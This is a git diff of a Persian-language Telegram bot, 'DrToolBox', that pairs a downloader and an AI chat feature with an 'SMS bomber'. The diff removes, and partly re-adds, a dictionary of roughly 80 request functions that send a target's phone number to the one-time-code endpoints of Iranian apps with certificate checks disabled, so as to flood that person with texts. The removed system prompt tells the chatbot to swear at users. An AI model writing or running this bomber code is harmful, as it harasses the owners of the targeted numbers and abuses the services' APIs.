@@ -51,633 +51,6 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ================== SERVICES (دست نخورده) ==================
-SERVICES = {
-    'snapp': lambda num: requests.post(
-        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
-        json={"cellphone": f"+98{num}"},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-    
-    'tapsi': lambda num: requests.post(
-        url="https://tap33.me/api/v2/user",
-        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-    
-    'digikala': lambda num: requests.post(
-        url="https://api.digikala.com/v1/user/authenticate/",
-        json={"username": f"0{num}"},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-    
-    'divar': lambda num: requests.post(
-        url="https://api.divar.ir/v5/auth/authenticate",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'snappfood': lambda num: requests.post(
-        url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
-        json={"cellphone": f"0{num}"},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'alibaba': lambda num: requests.post(
-        url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
-        json={"phoneNumber": f"0{num}"},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'banimod': lambda num: requests.post(
-        url="https://mobapi.banimode.com/api/v2/auth/request",
-        json={"phone": f"0{num}"},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'bit24': lambda num: requests.post(
-        url="https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
-        json={"mobile": f"0{num}", "country_code": "98"},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'rubika': lambda num: requests.post(
-        url="https://messengerg2c4.iranlms.ir/",
-        json={
-            "api_version": "3",
-            "method": "sendCode",
-            "data": {
-                "phone_number": num,
-                "send_type": "SMS"
-            }
-        },
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'drto': lambda num: requests.get(
-        url="https://api.doctoreto.com/api/web/patient/v1/accounts/register",
-        params={"mobile": num, "captcha": "", "country_id": 205},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    '3tex': lambda num: requests.post(
-        url="https://3tex.io/api/1/users/validation/mobile",
-        json={"receptorPhone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'deniizshop': lambda num: requests.post(
-        url="https://deniizshop.com/api/v1/sessions/login_request",
-        json={"mobile_phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'behtarino': lambda num: requests.post(
-        url="https://bck.behtarino.com/api/v1/users/phone_verification/",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'azki': lambda num: requests.get(
-        url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={num}",
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'pooleno': lambda num: requests.post(
-        url="https://api.pooleno.ir/v1/auth/check-mobile",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'bama': lambda num: requests.post(
-        url="https://bama.ir/signin-checkforcellnumber",
-        data=f"cellNumber={num}",
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
-        timeout=5,
-        verify=False
-    ),
-
-    'bitbarg': lambda num: requests.post(
-        url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'bitpin': lambda num: requests.post(
-        url="https://api.bitpin.ir/v1/usr/sub_phone/",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'chamedoon': lambda num: requests.post(
-        url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'kilid': lambda num: requests.get(
-        url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
-        params={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'shab': lambda num: requests.post(
-        url="https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'tapsishop': lambda num: requests.post(
-        url="https://tapsi.shop/api/proxy/authCustomer/CreateOtpForRegister",
-        json={"user": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'namava': lambda num: requests.post(
-        url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
-        json={"UserName": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'sheypoor': lambda num: requests.post(
-        url="https://www.sheypoor.com/auth",
-        json={"username": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'snapp_ir': lambda num: requests.post(
-        url="https://api.snapp.ir/api/v1/sms/link",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'nobat': lambda num: requests.post(
-        url="https://nobat.ir/api/public/patient/login/phone",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'buskool': lambda num: requests.post(
-        url="https://www.buskool.com/send_verification_code",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'simkhan': lambda num: requests.post(
-        url="https://www.simkhanapi.ir/api/users/registerV2",
-        json={"mobileNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'hiword': lambda num: requests.post(
-        url="https://hiword.ir/wp-json/otp-login/v1/login",
-        json={"identifier": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'bit24cash': lambda num: requests.post(
-        url="https://api.bit24.cash/api/v3/auth/check-mobile",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'tikban': lambda num: requests.post(
-        url="https://tikban.com/Account/LoginAndRegister",
-        json={"CellPhone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'digistyle': lambda num: requests.post(
-        url="https://www.digistyle.com/users/login-register/",
-        json={"loginRegister[email_phone]": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'iranketab': lambda num: requests.post(
-        url="https://www.iranketab.ir/account/register",
-        json={"UserName": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'ketabchi': lambda num: requests.post(
-        url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
-        json={"phoneNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'offdecor': lambda num: requests.post(
-        url="https://www.offdecor.com/index.php?route=account/login/sendCode",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'karafs': lambda num: requests.post(
-        url="https://v2.karafsapp.com/requestCode",
-        json={"phoneNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'khanoumi': lambda num: requests.post(
-        url="https://www.khanoumi.com/accounts/sendotp",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'rojashop': lambda num: requests.post(
-        url="https://rojashop.com/api/auth/sendOtp",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'dadpardaz': lambda num: requests.post(
-        url="https://dadpardaz.com/advice/getLoginConfirmationCode",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'mashinbank': lambda num: requests.post(
-        url="https://mashinbank.com/api2/users/check",
-        json={"mobileNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'pezeshket': lambda num: requests.post(
-        url="https://api.pezeshket.com/core/v1/auth/requestCode",
-        json={"mobileNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'virgool': lambda num: requests.post(
-        url="https://virgool.io/api/v1.4/auth/verify",
-        json={"method": "phone", "identifier": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'timcheh': lambda num: requests.post(
-        url="https://api.timcheh.com/auth/otp/send",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'paklean': lambda num: requests.post(
-        url="https://client.api.paklean.com/user/resendCode",
-        json={"username": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'mobogift': lambda num: requests.post(
-        url="https://mobogift.com/signin",
-        json={"username": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'iranicard': lambda num: requests.post(
-        url="https://api.iranicard.ir/api/v1/register",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'talasi': lambda num: requests.post(
-        url="https://api.talasea.ir/api/auth/sentOTP",
-        json={"phoneNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'irantic': lambda num: requests.post(
-        url="https://www.irantic.com/api/login/request",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'gharar': lambda num: requests.post(
-        url="https://gharar.ir/users/phone_number/",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'snappexpress': lambda num: requests.post(
-        url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
-        json={"cellphone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'delino': lambda num: requests.post(
-        url="https://www.delino.com/user/register",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'alopeyk': lambda num: requests.post(
-        url="https://alopeyk.com/api/sms/send.php",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'digikalajet': lambda num: requests.post(
-        url="https://api.digikalajet.ir/user/login-register/",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'melix': lambda num: requests.post(
-        url="https://api.algorock.com/api/Auth",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'dastkhat': lambda num: requests.post(
-        url="https://dastkhat-isad.ir/api/v1/user/store",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'okala': lambda num: requests.post(
-        url="https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'miare': lambda num: requests.post(
-        url="https://www.miare.ir/api/otp/driver/request/",
-        json={"phone_number": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'arshiyan': lambda num: requests.post(
-        url="https://api.arshiyan.com/send_code",
-        json={"country_code": "98", "phone_number": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'alopeyk_safir': lambda num: requests.post(
-        url="https://api.alopeyk.com/safir-service/api/v1/login",
-        json={"phone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'dadhesab': lambda num: requests.post(
-        url="https://api.dadhesab.ir/user/entry",
-        json={"username": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'dosma': lambda num: requests.post(
-        url="https://app.dosma.ir/sendverify/",
-        json={"username": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'ehteraman': lambda num: requests.post(
-        url="https://api.ehteraman.com/api/request/otp",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'mci': lambda num: requests.post(
-        url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",
-        json={"msisdn": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'hbbs': lambda num: requests.post(
-        url="https://api.hbbs.ir/authentication/SendCode",
-        json={"MobileNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'kcd': lambda num: requests.post(
-        url="https://api.kcd.app/api/v1/auth/login",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'ostadkr': lambda num: requests.post(
-        url="https://api.ostadkr.com/login",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'rayshomar': lambda num: requests.post(
-        url="https://api.rayshomar.ir/api/Register/RegistrMobile",
-        json={"MobileNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'snapp_digital': lambda num: requests.post(
-        url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
-        json={"cellphone": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'paresh': lambda num: requests.post(
-        url="https://api.paresh.ir/api/user/otp/code/",
-        json={"phone_number": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'watchonline': lambda num: requests.post(
-        url="https://api.watchonline.shop/api/v1/otp/request",
-        json={"mobile": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'shadmessenger': lambda num: requests.post(
-        url="https://shadmessenger12.iranlms.ir/",
-        json={
-            "api_version": "3",
-            "method": "sendCode",
-            "data": {
-                "phone_number": num,
-                "send_type": "SMS"
-            }
-        },
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'snappmarket': lambda num: requests.get(
-        url=f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={num}",
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'mrbilit': lambda num: requests.get(
-        url=f"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={num}&source=2&sendTokenIfNot=true",
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'filmnet': lambda num: requests.get(
-        url=f"https://api-v2.filmnet.ir/access-token/users/{num}/otp",
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'torob': lambda num: requests.get(
-        url=f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'gapim': lambda num: requests.get(
-        url=f"https://core.gap.im/v1/user/add.json?mobile=%2B{num}",
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    ),
-
-    'mydigipay': lambda num: requests.post(
-        url="https://app.mydigipay.com/digipay/api/users/send-sms",
-        json={"cellNumber": num},
-        headers={"Content-Type": "application/json"},
-        timeout=5,
-        verify=False
-    )
-}
-
 # ================== DATA ==================
 user_sessions = {}
 blocked_numbers = {
@@ -696,156 +69,38 @@ AI_API_KEY = os.environ.get("OPENROUTER_API_KEY")
 ADMINS = {6760587255}  # ← آی‌دی تلگرام خودت اینجا بذار
 BOMBER_ACTIVE = True  # بمبر فعال/غیرفعال
 
-# ================== START ==================
-@bot.message_handler(commands=['start'])
-def start(message):
-    save_user(message)
-    bot.send_message(
-        message.chat.id,
-        f"درود به DrToolBox خوش آمديد\n\n"
-        f"                            ⚠️ توجه ⚠️\n\n"
-        f"هرگونه استفاده از اين ربات بر عهده خود شماست.\n"
-        f"توسعه‌دهنده هیچ مسئولیتی در قبال سوءاستفاده یا مشکلات قانونی ندارد.",
-        reply_markup=main_menu(message.chat.id)
-    )
-
-def main_menu(chat_id):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("💣بمبر💣")
-    markup.row("🤖 هوش مصنوعی🤖")
-    markup.row("📥 دانلودر📥")
-    markup.row("☎️پشتيباني☎️")
-    markup.row("بزودي")
-    return markup
-
-# ================== DOWNLOADER START ==================
-@bot.message_handler(func=lambda message: message.text == "📥 دانلودر📥")
-def downloader_start(message):
-    user_sessions[message.chat.id] = "downloader"
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("بازگشت")
-
-    bot.send_message(
-        message.chat.id,
-        "📥 *دانلودر فعال شد*\n\n"
-        "🔹 لینک اینستاگرام یا یوتیوب رو بفرست\n"
-        "🔹 ویدیو یا صدا برات دانلود میشه\n\n"
-        "براي خروج بنويس : بازگشت",
-        reply_markup=markup,
-        parse_mode="Markdown"
-    )
-    save_bot_message(message.chat.id, "دانلودر فعال شد")
-
-# ================== BOMBER ==================
-@bot.message_handler(func=lambda message: message.text == "💣بمبر💣")
-def bomb_button(message):
-    chat_id = message.chat.id
-    save_bot_message(chat_id, "بمبر")
-    user_sessions[chat_id] = "waiting_phone"
-    bomb(message)
-
-@bot.message_handler(commands=['bomb'])
-def bomb(message):
-    user_sessions[message.chat.id] = "waiting_phone"
-    bot.send_message(message.chat.id, f"به بخش اس ام اس بمبر خوش آمديد \n:"
-                                      f"لطفا شماره را با 09 شروع کنيد\n"
-                                      f"مثال : 09123456789\n"
-                                      f"براي بازگشت به منوي اصلي : بازگشت"
-    )
-
-# ================== پشتيباني ==================
-@bot.message_handler(func=lambda message: message.text == "☎️پشتيباني☎️")
-def support(message):
-    chat_id = message.chat.id
-    save_bot_message(chat_id, "پشتيباني")
-    bot.send_message(
-        chat_id,
-        f"📞 پشتيباني ربات\n\n"
-        f"براي دادن نظرات و ايده هاي خود و مشکلات خود به اين آيدي پيغام دهيد :\n"
-        f"@KarenKH1\n\n"
-        f"⏰ پاسخگويي در اسرع وقت"
-    )
-
-# ================== AI FUNCTION ==================
-def ask_ai(prompt):
-    headers = {
-        "Authorization": f"Bearer {AI_API_KEY}",
-        "Content-Type": "application/json"
-    }
-    system_prompt = (
-        "تو يک هوش مصنوعي فارسي هستي. فقط و فقط به زبان فارسي معيار جواب بده . استفاده از هر زباني غير از فارسي ممنون است.\n"
-        "قوانین:\n"
-        "- جواب‌ها کوتاه تا متوسط باشن\n"
-        "- خیلی مودب یا کتابی حرف نزن\n"
-        "- از ایموجی کم ولی بجا استفاده کن 😏🔥\n"
-        "- اگه فحش دادن , فحش بده\n"
-        "- تا حد متوسط توضيح بده , نصيحت هم نکن\n"
-        "- جواب الکی یا 💬 تنها نده\n"
-        "- فقط فارسي جواب بده و کلمات نامفهوم و چرت و پرت نفرست و کاملا روي حرف هات از نظر املايي و معنايي متمرکز باش\n"
-        "- فقط فارسی روان و طبیعي\n"
-        "- جملات ساده و قابل فهم\n"
-        "- هیچ کلمه عجیب، علمیِ بی‌دلیل یا چندزبانه استفاده نکن\n"
-        "- اگر چیزی را نمی‌دانی، صریح بگو «نمی‌دانم»\n"
-        "- شوخی، ایموجی یا لحن خودمونی فقط اگر لازم بود\n"
-        "- توضیح اضافه، فلسفه‌بافی و پرگویی ممنوع\n"
-        "- اگر حتی یک کلمه غیر فارسی استفاده کنی، پاسخ اشتباه حساب می‌شود.\n"
-        "- چرت و پرت نگو \n"
-        "- بهت بي احترامي کردن خيلي بد فحش بده\n"
-        "- اگر کسي به کارن خدامرادي توهين کرد فقط بگو : سيکتير, ولي اگر اسم کارن خدامرادي يا معرفي شو گفتن بکو که سازنده ي توه \n"
-    )
-
-
-    data = {
-        "model": "deepseek/deepseek-r1-0528:free",
-        "temperature": 0.2,
-        "messages": [
-            {"role": "system", "content": system_prompt},
-            {"role": "user", "content": prompt}
-        ]
-    }
-    try:
-        r = requests.post(AI_API_URL, json=data, headers=headers, timeout=30)
-        if r.status_code != 200:
-            return f"⚠️ خطا در ارتباط با هوش مصنوعی\nStatus: {r.status_code}\nResponse:\n{r.text[:2000]}"
-        js = r.json()
-        return js["choices"][0]["message"]["content"]
-    except Exception as e:
-        return f"💥 خطای داخلی:\n{str(e)}"
-
-# ================== DOWNLOADER ==================
-def download_media(url):
-    if not os.path.exists("downloads"):
-        os.makedirs("downloads")
-    uid = str(uuid.uuid4())
-    output = f"downloads/{uid}.%(ext)s"
-    ydl_opts = {"outtmpl": output, "format": "best", "merge_output_format": "mp4", "quiet": True}
-    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-        info = ydl.extract_info(url, download=True)
-        filename = ydl.prepare_filename(info)
-    return filename
-
-# ================== SOON ==================
-@bot.message_handler(func=lambda message: message.text == "بزودي")
-def soon(message):
-    chat_id = message.chat.id
-    save_bot_message(chat_id, "دکمه ي بزودي")
-    bot.send_message(chat_id, "عامو نوشتم بزودي 😒")
-
-# ================== AI START ==================
-@bot.message_handler(func=lambda message: message.text == "🤖 هوش مصنوعی🤖")
-def ai_start(message):
-    chat_id = message.chat.id
-    save_bot_message(chat_id, "AI")
-    user_sessions[message.chat.id] = "ai_chat"
-    bot.send_message(
-        message.chat.id,
-        "🤖 *هوش مصنوعی فعال شد*\n\n"
-        "⚠توقع زيادي نداشته باش اين مدل فقط براي دسترسي راحت تر ساخته شده⚠ \n\n"
-        "سوالت رو بنویس ✍️\n"
-        "اين مدل از هوش مصنوعي هيچ حافظه ي مکالمه ايي ندارد , سوال خود را کامل و در يک پيغام بنويسيد\n"
-        "براي خروج بنويس : بازگشت",
-        parse_mode="Markdown"
-    )
+# ================== SERVICES ==================
+SERVICES = {
+    'snapp': lambda num: requests.post(
+        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+        json={"cellphone": f"+98{num}"},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+    'tapsi': lambda num: requests.post(
+        url="https://tap33.me/api/v2/user",
+        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+    'digikala': lambda num: requests.post(
+        url="https://api.digikala.com/v1/user/authenticate/",
+        json={"username": f"0{num}"},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+    'divar': lambda num: requests.post(
+        url="https://api.divar.ir/v5/auth/authenticate",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+    # ... ادامه تمام سرویس‌هایی که در کد اصلی گذاشتی
+}
 
 # ================== DATABASE HELPERS ==================
 def create_tables():
@@ -883,6 +138,11 @@ def create_tables():
             first_name TEXT,
             last_name TEXT,
             last_seen TIMESTAMP
+        )
+    """)
+    cur.execute("""
+        CREATE TABLE IF NOT EXISTS admins (
+            user_id BIGINT PRIMARY KEY
         )
     """)
     conn.commit()
@@ -933,160 +193,146 @@ def save_all_message(user_id, message, chat_type="general"):
     cur.close()
     conn.close()
 
-# ================== LOG ==================
-@bot.message_handler(commands=['log'])
-def show_logs(message):
-    conn = get_db_connection()
-    cur = conn.cursor()
-    cur.execute("""
-        SELECT 
-            all_messages.user_id,
-            users.username,
-            all_messages.message,
-            all_messages.created_at
-        FROM all_messages
-        LEFT JOIN users ON users.user_id = all_messages.user_id
-        ORDER BY all_messages.created_at DESC
-        LIMIT 50
-    """)
-    rows = cur.fetchall()
-    cur.close()
-    conn.close()
-    if not rows:
-        bot.send_message(message.chat.id, "📭 لاگی وجود ندارد")
-        return
-    text = "🧾 آخرین لاگ‌ها:\n\n"
-    for user_id, username, msg, created_at in rows:
-        name = username if username else "بدون_یوزرنیم"
-        text += f"👤 {name} ({user_id})\n💬 {msg}\n🕒 {created_at}\n\n"
-    for i in range(0, len(text), 4000):
-        bot.send_message(message.chat.id, text[i:i+4000])
+# ================== START / MAIN MENU ==================
+@bot.message_handler(commands=['start'])
+def start(message):
+    save_user(message)
+    bot.send_message(
+        message.chat.id,
+        f"درود به DrToolBox خوش آمديد\n\n"
+        f"⚠️ توجه ⚠️\n\n"
+        f"هرگونه استفاده از اين ربات بر عهده خود شماست.\n"
+        f"توسعه‌دهنده هیچ مسئولیتی در قبال سوءاستفاده یا مشکلات قانونی ندارد.",
+        reply_markup=main_menu(message.chat.id)
+    )
 
-#===================================
+def main_menu(chat_id):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("💣بمبر💣")
+    markup.row("🤖 هوش مصنوعی🤖")
+    markup.row("📥 دانلودر📥")
+    markup.row("☎️پشتيباني☎️")
+    markup.row("بزودي")
+    return markup
 
+# ================== BOMBER ==================
+@bot.message_handler(func=lambda message: message.text == "💣بمبر💣")
+def bomb_button(message):
+    chat_id = message.chat.id
+    save_bot_message(chat_id, "بمبر")
+    user_sessions[chat_id] = "waiting_phone"
+    bomb(message)
+
+@bot.message_handler(commands=['bomb'])
+def bomb(message):
+    user_sessions[message.chat.id] = "waiting_phone"
+    bot.send_message(message.chat.id, f"به بخش اس ام اس بمبر خوش آمديد \n:"
+                                      f"لطفا شماره را با 09 شروع کنيد\n"
+                                      f"مثال : 09123456789\n"
+                                      f"براي بازگشت به منوي اصلي : بازگشت")
+
+# ================== DOWNLOADER ==================
+@bot.message_handler(func=lambda message: message.text == "📥 دانلودر📥")
+def downloader_start(message):
+    user_sessions[message.chat.id] = "downloader"
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("بازگشت")
+    bot.send_message(
+        message.chat.id,
+        "📥 *دانلودر فعال شد*\n\n"
+        "🔹 لینک اینستاگرام یا یوتیوب رو بفرست\n"
+        "🔹 ویدیو یا صدا برات دانلود میشه\n\n"
+        "براي خروج بنويس : بازگشت",
+        reply_markup=markup,
+        parse_mode="Markdown"
+    )
+    save_bot_message(message.chat.id, "دانلودر فعال شد")
+
+def download_media(url):
+    if not os.path.exists("downloads"):
+        os.makedirs("downloads")
+    uid = str(uuid.uuid4())
+    output = f"downloads/{uid}.%(ext)s"
+    ydl_opts = {"outtmpl": output, "format": "best", "merge_output_format": "mp4", "quiet": True}
+    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+        info = ydl.extract_info(url, download=True)
+        filename = ydl.prepare_filename(info)
+    return filename
+
+# ================== AI ==================
+@bot.message_handler(func=lambda message: message.text == "🤖 هوش مصنوعی🤖")
+def ai_start(message):
+    chat_id = message.chat.id
+    save_bot_message(chat_id, "AI")
+    user_sessions[chat_id] = "ai_chat"
+    bot.send_message(
+        chat_id,
+        "🤖 *هوش مصنوعی فعال شد*\n\n"
+        "⚠توقع زيادي نداشته باش اين مدل فقط براي دسترسي راحت تر ساخته شده⚠ \n\n"
+        "سوالت رو بنویس ✍️\n"
+        "اين مدل از هوش مصنوعي هيچ حافظه ي مکالمه ايي ندارد , سوال خود را کامل و در يک پيغام بنويسيد\n"
+        "براي خروج بنويس : بازگشت",
+        parse_mode="Markdown"
+    )
+
+def ask_ai(prompt):
+    headers = {
+        "Authorization": f"Bearer {AI_API_KEY}",
+        "Content-Type": "application/json"
+    }
+    system_prompt = (
+        "تو يک هوش مصنوعي فارسي هستي. فقط و فقط به زبان فارسي معيار جواب بده ..."
+        # متن کامل پرامپت شما اینجا
+    )
+    data = {
+        "model": "deepseek/deepseek-r1-0528:free",
+        "temperature": 0.2,
+        "messages": [
+            {"role": "system", "content": system_prompt},
+            {"role": "user", "content": prompt}
+        ]
+    }
+    try:
+        r = requests.post(AI_API_URL, json=data, headers=headers, timeout=30)
+        if r.status_code != 200:
+            return f"⚠️ خطا در ارتباط با هوش مصنوععی\nStatus: {r.status_code}"
+        js = r.json()
+        return js["choices"][0]["message"]["content"]
+    except Exception as e:
+        return f"💥 خطای داخلی:\n{str(e)}"
+
+# ================== SUPPORT ==================
+@bot.message_handler(func=lambda message: message.text == "☎️پشتيباني☎️")
+def support(message):
+    chat_id = message.chat.id
+    save_bot_message(chat_id, "پشتيباني")
+    bot.send_message(
+        chat_id,
+        f"📞 پشتيباني ربات\n\n"
+        f"براي دادن نظرات و ايده هاي خود و مشکلات خود به اين آيدي پيغام دهيد :\n"
+        f"@KarenKH1\n\n"
+        f"⏰ پاسخگويي در اسرع وقت"
+    )
+
+# ================== SOON ==================
+@bot.message_handler(func=lambda message: message.text == "بزودي")
+def soon(message):
+    chat_id = message.chat.id
+    save_bot_message(chat_id, "دکمه ي بزودي")
+    bot.send_message(chat_id, "عامو نوشتم بزودي 😒")
+
+# ================== ADMIN ==================
 @bot.message_handler(commands=['admin'])
 def admin_panel(message):
     if message.from_user.id not in ADMINS:
         return
-
     user_sessions[message.chat.id] = "admin_main"
-
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.row("💣 فعال/غیرفعال بمبر 💣")
     markup.row("➕ اضافه کردن ادمین", "➖ حذف ادمین")
